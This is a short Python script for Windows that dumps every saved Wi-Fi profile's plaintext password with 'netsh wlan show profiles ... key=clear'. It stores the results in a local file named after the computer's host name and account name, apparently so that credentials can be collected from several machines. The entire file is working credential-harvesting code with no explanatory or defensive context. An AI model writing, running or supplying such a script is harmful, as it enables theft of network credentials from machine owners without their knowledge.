import subprocess,re,socket
WIFIS=list(x[2:] for x in re.findall(r': .*', subprocess.getoutput('netsh wlan show profiles')))
dic={}
for wifi in WIFIS:
    #print(wifi)
    a=subprocess.getoutput(f'netsh wlan show profiles {wifi} key=clear')
    try:
        new=re.search(r'Key Content.*',a)
        new=new.group()
        new= new[new.index(':')+2:]
        dic[wifi]=new   
    except:
        dic[wifi]=None
from rx7 import write,system
Device_Name= socket.gethostname()+' - '+system.accname()
write('.\\F\\{}\\WF PS'.format(Device_Name),str(dic))